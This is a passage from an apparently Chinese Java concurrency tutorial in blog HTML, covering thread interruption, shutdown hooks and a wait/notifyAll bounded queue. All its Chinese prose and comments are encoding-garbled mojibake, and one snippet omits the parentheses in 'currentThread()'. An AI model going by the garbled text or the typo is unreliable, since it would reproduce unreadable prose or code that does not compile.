class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>public static boolean interrupted()</p><ul><li>è¿”å›å½“å‰çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€</li><li>å°†å½“å‰çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€è®¾ä¸ºfalse</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Tests if some Thread has been interrupted.  The interrupted state</span></span><br><span class="line"><span class="comment">* is reset or not based on the value of ClearInterrupted that is</span></span><br><span class="line"><span class="comment">* passed.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> ClearInterrupted æ˜¯å¦æ¸…é™¤ä¸­æ–­çŠ¶æ€</span></span><br><span class="line"><span class="comment">* æ¸…é™¤ä¸­æ–­çŠ¶æ€</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">(<span class="type">boolean</span> ClearInterrupted)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">interrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentThread().isInterrupted(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Interrupted</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">//ä¸­æ–­åç»“æŸå¾ªç¯</span></span><br><span class="line">            <span class="comment">//while (!Thread.currentThread().isInterrupted()) &#123;</span></span><br><span class="line">            <span class="comment">//    System.out.println(&quot;.&quot;);</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// å¦‚æœçº¿ç¨‹è¢«ä¸­æ–­åï¼Œæˆ‘ä»¬å¹¶ä¸æƒ³ç«‹å³ä¸­æ–­å®ƒé‚£ä¹ˆæˆ‘ä»¬éœ€è¦é‡ç½®ä¸­æ–­çŠ¶æ€ä¸º`æœªä¸­æ–­`ã€‚</span></span><br><span class="line">            <span class="comment">// ä¸ç„¶å¾ˆå¤šä¾èµ–ä¸­æ–­çŠ¶æ€çš„æ–¹æ³•ä¼šå‡ºé”™ï¼Œä¾‹å¦‚åé¢çš„sleepã€‚</span></span><br><span class="line">            <span class="comment">// é‡ç½®ä¸­æ–­çŠ¶æ€ï¼Œç½®çº¿ç¨‹çŠ¶æ€ä¸ºæœªä¸­æ–­ã€‚</span></span><br><span class="line">            <span class="comment">// Thread.interrupted();</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">4000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="comment">// é˜»å¡çš„çº¿ç¨‹è¢«ä¸­æ–­åï¼Œä¼šæŠ›å‡ºInterruptedExceptionå¼‚å¸¸ã€‚å¹¶ä¸”ä¸­æ–­çŠ¶æ€ä¼šé‡ç½®ä¸ºæœªä¸­æ–­</span></span><br><span class="line">                <span class="comment">// å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¸ºäº†ä¸­æ–­ä¿è¯çŠ¶æ€çš„æ­£ç¡®ï¼Œéœ€è¦åœ¨æ•è·å¼‚å¸¸åå°†çŠ¶æ€é‡ç½®ä¸ºå·²ä¸­æ–­</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// æ¢å¤ä¸­æ–­(çŠ¶æ€) ç½®çº¿ç¨‹çŠ¶æ€ä¸ºä¸­æ–­</span></span><br><span class="line">                System.out.printf(<span class="string">&quot;catch1: %b\n&quot;</span>, Thread.currentThread().isInterrupted());</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">                System.out.printf(<span class="string">&quot;catch2: %b\n&quot;</span>, Thread.currentThread().isInterrupted());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t.start();</span><br><span class="line">        <span class="comment">// Thread.sleep(4);</span></span><br><span class="line">        <span class="comment">// ä¸­æ–­çº¿ç¨‹</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">    </span><br><span class="line">        System.out.printf(<span class="string">&quot;outer1: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line">        System.out.printf(<span class="string">&quot;outer2: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line">        System.out.printf(<span class="string">&quot;outer3: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸¤ä¸ªçº¿ç¨‹ï¼Œæ‰“å°é¡ºåºæ¯æ¬¡å¯èƒ½ä¸åŒ</span></span><br><span class="line">        <span class="comment">// out &gt;&gt;</span></span><br><span class="line">        <span class="comment">//outer1: true   // åˆšè¢«ä¸­æ–­ï¼ŒçŠ¶æ€å˜ä¸ºå·²ä¸­æ–­</span></span><br><span class="line">        <span class="comment">//outer2: false  // ä¸­æ–­è¢«catchåçŠ¶æ€å˜ä¸ºæœªä¸­æ–­</span></span><br><span class="line">        <span class="comment">//outer3: false  // å·²ä¸­æ–­</span></span><br><span class="line">        <span class="comment">//catch1: false  // æ•è·å¼‚å¸¸åï¼ŒçŠ¶æ€ä¸ºæœªä¸­æ–­</span></span><br><span class="line">        <span class="comment">//catch2: true   // æ•è·å¼‚å¸¸åï¼Œé‡ç½®ä¸­æ–­çŠ¶æ€å</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//out &gt;&gt;</span></span><br><span class="line">        <span class="comment">//outer1: true   // åˆšè¢«ä¸­æ–­ï¼ŒçŠ¶æ€å˜ä¸ºå·²ä¸­æ–­</span></span><br><span class="line">        <span class="comment">//catch1: false  // æ•è·å¼‚å¸¸åï¼ŒçŠ¶æ€ä¸ºæœªä¸­æ–­</span></span><br><span class="line">        <span class="comment">//outer2: false  // ä¸­æ–­è¢«catchåçŠ¶æ€å˜ä¸ºæœªä¸­æ–­</span></span><br><span class="line">        <span class="comment">//catch2: true   // æ•è·å¼‚å¸¸åï¼Œé‡ç½®ä¸­æ–­çŠ¶æ€å</span></span><br><span class="line">        <span class="comment">//outer3: true   // catché‡Œé¢é‡ç½®çŠ¶æ€ä¸­æ–­çŠ¶æ€å</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å¦‚ä½•ä¸­æ–­ä»»åŠ¡ï¼Ÿ"><a href="#å¦‚ä½•ä¸­æ–­ä»»åŠ¡ï¼Ÿ" class="headerlink" title="å¦‚ä½•ä¸­æ–­ä»»åŠ¡ï¼Ÿ"></a>å¦‚ä½•ä¸­æ–­ä»»åŠ¡ï¼Ÿ</h4><p>å¯ä¸­æ–­ä»»åŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">    <span class="comment">// æ¢å¤ä¸­æ–­çŠ¶æ€</span></span><br><span class="line">    Thread.currentThread.interrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å¯ä¸­æ–­éé˜»å¡ä»»åŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å¯ä¸­æ–­é˜»å¡ä»»åŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SocketThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SocketThread</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å¤„ç†ä¸­æ–­</span></span><br><span class="line"><span class="comment">     * å…³é—­socketè§¦å‘IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ignore) &#123;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ReadableByteChannel</span> <span class="variable">channel</span> <span class="operator">=</span> Channels.newChannel(socket.getInputStream())) &#123;</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¿™é‡Œä¼šé˜»å¡</span></span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != channel.read(buffer)) &#123;</span><br><span class="line">                buffer.flip();</span><br><span class="line">                <span class="comment">// write</span></span><br><span class="line">                buffer.clear();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line">            <span class="comment">// socket.close() è§¦å‘ IOException çº¿ç¨‹é€€å‡º</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Shutdown-Hook"><a href="#Shutdown-Hook" class="headerlink" title="Shutdown Hook"></a>Shutdown Hook</h4><p>JVMåœ¨é€€å‡ºå‰ä¼šé¦–å…ˆè°ƒç”¨æ‰€æœ‰æ³¨å†Œçš„å…³é—­é’©å­ã€‚JVMä¸ä¿è¯è°ƒç”¨é¡ºåºï¼ˆå¯ä»¥æ³¨å†Œå¤šä¸ªé’©å­ï¼‰ï¼Œé’©å­å¿…é¡»æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚æˆ‘ä»¬åœ¨é’©å­é‡Œé¢å¯ä»¥åšæ¸…ç†å·¥ä½œã€‚é’©å­åº”å½“å°½å¿«é€€å‡ºï¼Œå®ƒä¼šå»¶è¿ŸJVMç»“æŸæ—¶é—´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// æ¸…ç†å·¥ä½œ</span></span><br><span class="line">    System.out.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h4 id="å†…ç½®æ¡ä»¶é˜Ÿåˆ—"><a href="#å†…ç½®æ¡ä»¶é˜Ÿåˆ—" class="headerlink" title="å†…ç½®æ¡ä»¶é˜Ÿåˆ—"></a>å†…ç½®æ¡ä»¶é˜Ÿåˆ—</h4><p>è¿™é‡Œçš„æ¡ä»¶æ˜¯ä¸€ç§<strong>çŠ¶æ€</strong>ï¼Œå½“è¾¾åˆ°æŸç§çŠ¶æ€åæˆ‘ä»¬å¯ä»¥ç»§ç»­åé¢çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œ<code>é˜Ÿåˆ—ç©º</code>ã€<code>é˜Ÿåˆ—æ»¡</code>éƒ½æ˜¯ä¸€ç§çŠ¶æ€ï¼Œå½“é˜Ÿåˆ—ä¸ºç©ºæ—¶æˆ‘ä»¬ä¸èƒ½<code>take</code>æ“ä½œï¼Œå½“é˜Ÿåˆ—æ»¡æ—¶æˆ‘ä»¬ä¸èƒ½<code>push</code>æ“ä½œã€‚å½“é‡åˆ°ä¸Šè¿°çŠ¶æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¯èƒ½éœ€è¦ç­‰å¾…ï¼Œç­‰å¾…çŠ¶æ€å˜æ›´æˆ‘ä»¬èƒ½è¿›ä¸€æ­¥æ‰§è¡Œã€‚ç­‰å¾…çš„æ–¹å¼æœ‰å¤šç§ï¼Œæˆ‘ä»¬å¯ä»¥<code>è‡ªæ—‹</code>ä¹Ÿå¯ä»¥<code>ä¼‘çœ </code>ã€‚å¦‚æœç­‰å¾…æ—¶é—´è¿‡ä¹…ï¼Œ<code>è‡ªæ—‹</code>ä¼šæµªè´¹å¤§é‡çš„CPUèµ„æºã€‚å¦‚æœ<code>ä¼‘çœ </code>æˆ‘ä»¬ç³»ç»Ÿå°†ä¸å¤Ÿçµæ•ã€‚å¦‚æœèƒ½æœ‰ä¸€ç§<code>é€šçŸ¥æœºåˆ¶</code>ï¼Œå½“çŠ¶æ€å˜æ›´æ—¶é€šçŸ¥æˆ‘ä»¬çš„çº¿ç¨‹é†’æ¥å†æ¬¡æ£€æŸ¥çŠ¶æ€ã€‚</p><p>Javaé‡Œé¢wait&#x2F;notifyå°±æ˜¯è¿™ç§æœºåˆ¶ã€‚å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæŠŠé”ä¸Š<code>wait</code>æ—¶ï¼Œçº¿ç¨‹å°†<strong>é‡Šæ”¾é”</strong>å¹¶ä¸”CPUèµ„æºå¤„äºä¼‘çœ çŠ¶æ€ã€‚å½“åœ¨ä¸€æŠŠé”ä¸Šè°ƒç”¨<code>notify/notifyAll</code>æ—¶å°†å”¤é†’åœ¨åŒä¸€æŠŠé”ä¸Šç­‰å¾…çš„çº¿ç¨‹ã€‚è¿™æ—¢é¿å…äº†<code>è‡ªæ—‹</code>è¿‡ä¹…å¯¹äºCPUçš„æµªè´¹ï¼Œä¹Ÿè§£å†³äº†<code>ä¼‘çœ </code>æ—¶ä¸èƒ½ç«‹å³å”¤é†’çš„é—®é¢˜ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åšæ¯ä¸€æŠŠé”ä¸Šé¢éƒ½æœ‰ä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—é‡Œé¢å­˜æ”¾çš„æ˜¯è¿™æŠŠé”ä¸Š<code>wait</code>çš„çº¿ç¨‹ï¼Œå½“åœ¨è¿™æŠŠé”ä¸Šè°ƒç”¨<code>notify/notifyAll</code>æ—¶ä¼šå”¤é†’é˜Ÿåˆ—é‡Œé¢çš„çº¿ç¨‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;T&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.size() &gt;= capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">return</span> take(Long.MAX_VALUE); <span class="comment">// é»˜è®¤æœ€å¤§å€¼ï¼Œé¿å…waitæ— æ„ä¹‰çš„è‡ªåŠ¨å”¤é†’</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// é”ä¸€ä¸ªç§æœ‰çš„å¯¹è±¡ç”¨æ¥å°é—­æ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">        <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">            <span class="keyword">while</span> (isEmpty()) list.wait(timeout);</span><br><span class="line"></span><br><span class="line">            <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> list.remove(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// æ³¨æ„ï¼šæ­¤å¤„å¿…é¡»æ˜¯notifyAllï¼Œå› ä¸ºåœ¨listè¿™æŠŠé”ä¸Šé™¤äº†ç­‰å¾…`isEmpty`æ¡ä»¶è¿˜æœ‰ç­‰å¾…`isFull`æ¡ä»¶ç­‰å¾…çš„çº¿ç¨‹</span></span><br><span class="line">            <span class="comment">// å¦‚æœä»…ä»…æ˜¯notifyå°†ä¼šåªå”¤é†’ä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ‘ä»¬æœ¬æ„æ˜¯æƒ³å”¤é†’`isFull`æ¡ä»¶çœç­‰å¾…çš„çº¿ç¨‹ã€‚å¦‚æœå”¤é†’çš„æ°æ°åˆæ˜¯`isEmpty`æ¡ä»¶ä¸Šç­‰å¾…çš„çº¿ç¨‹ï¼Œ</span></span><br><span class="line">            <span class="comment">// é‚£ä¹ˆå°†ä¼šå‡ºç°è™½ç„¶`isFull`æ¡ä»¶å·²ç»æ»¡è¶³ï¼Œä½†æ˜¯åœ¨ä¸Šè¿°æ¡ä»¶ä¸Šç­‰å¾…çš„çº¿ç¨‹å°†ä¸èƒ½è¢«å”¤é†’ã€‚</span></span><br><span class="line">            <span class="comment">// è¦è§£å†³ä¸Šè¿°é—®é¢˜ç°åœ¨åªæœ‰ç”¨notifyAllå”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ï¼ˆæƒŠç¾¤æ•ˆåº”ï¼‰ï¼Œè®©å®ƒä»¬é‡æ–°æ£€æŸ¥æ¡ä»¶ã€‚å¦‚æœç¬¦åˆåˆ™å‘ä¸‹æ‰§è¡Œï¼Œå¦‚æœä¸ç¬¦åˆç»§ç»­ä¼‘çœ ã€‚</span></span><br><span class="line">            <span class="comment">// è¦å®Œç¾è§£å†³ä¸Šè¿°é—®é¢˜éœ€è¦åé¢çš„`Condition`æ¡ä»¶é˜Ÿåˆ—æ”¯æŒã€‚</span></span><br><span class="line">            list.notifyAll();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        push(t, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t, <span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">            <span class="keyword">while</span> (isFull()) list.wait(timeout);</span><br><span class="line"></span><br><span class="line">            list.add(t);</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªJava 1.5å¼€å§‹ï¼ŒJavaå¹¶å‘åŒ…æä¾›äº†æ–°çš„é€‰æ‹©ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Condition</code>æ¥å®ç°æ¡ä»¶é˜Ÿåˆ—ã€‚å®ƒä¸ä¼ ç»Ÿçš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œåœ¨åŒä¸€æŠŠé”ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå¤šä¸ªæ¡ä»¶é˜Ÿåˆ—ï¼Œä¸åŒçš„æ¡ä»¶å¯ä»¥æ”¾åˆ°ä¸åŒçš„é˜Ÿåˆ—ä¸­ã€‚ä¸Šä¾‹ä¸­æœ‰ä¸ªå¼Šç«¯ï¼Œå½“æˆ‘ä»¬<code>notifyAll</code>æ—¶<code>isEmpty</code>å’Œ<code>isFull</code>æ¡ä»¶ç­‰å¾…çš„çº¿ç¨‹éƒ½ä¼šè¢«å”¤é†’ã€‚å¦å¤–ä¸€ä¸ªå¼Šç«¯æ˜¯æ‰€æœ‰çº¿ç¨‹éƒ½ä¼šè¢«å”¤é†’ï¼Œä½†æ˜¯ä¸æ˜¯æ‰€æœ‰çš„çº¿ç¨‹è·å–é”å†ç»§ç»­æ‰§è¡Œæ—¶å°±èƒ½æ»¡è¶³æ¡ä»¶ï¼Œæœ‰å¯èƒ½ä¼šå†æ¬¡è¿›å…¥ç­‰å¾…ã€‚ä¾‹å¦‚å¯¹äºç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼Œæœ‰å¤šä¸ªæ¶ˆè´¹è€…ç­‰å¾…è€Œæ­¤æ—¶åªæœ‰ä¸€ä¸ªç”Ÿäº§è€…åªç”Ÿäº§äº†ä¸€ä¸ªï¼Œé‚£ä¹ˆæ‰€æœ‰æ¶ˆè´¹è€…éƒ½è¢«å”¤é†’æ—¶ï¼Œåªæœ‰ä¸€ä¸ªä¼šæˆåŠŸæŠ¢åˆ°ä»»åŠ¡ã€‚å…¶å®ƒä¼šåœ¨å”¤é†’åå†æ¬¡ç­‰å¾…ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯ç”±äºæ‰€æœ‰æ¡ä»¶éƒ½åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œè¿™ä¸ªé˜Ÿåˆ—ä¸­å¯èƒ½æ—¢<code>é˜Ÿåˆ—ç©º</code>åˆæœ‰<code>é˜Ÿåˆ—æ»¡</code>ä¸¤ç§ç­‰å¾…æ¡ä»¶ã€‚æˆ‘ä»¬ä¸€ä¸ª<code>notifyAll</code>ä¼šå”¤é†’ä¸¤è€…ï¼Œè€Œå®é™…æƒ…å†µæ˜¯æˆ‘ä»¬åªæƒ³å”¤é†’ä¸€ç§æ¡ä»¶ã€‚ä¾‹å¦‚ï¼Œ<code>push</code>æ—¶åªæƒ³å”¤é†’<code>é˜Ÿåˆ—ç©º</code>æ¡ä»¶çš„ç­‰å¾…ï¼Œè€Œ<code>take</code>æ—¶åªæƒ³å”¤é†’<code>é˜Ÿåˆ—æ»¡</code>æ¡ä»¶çš„ç­‰å¾…ã€‚è¿™ç§æ— å·®åˆ«çš„å”¤é†’åŒæ ·ä¼šé€ æˆä¸€ç§æµªè´¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;T&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span 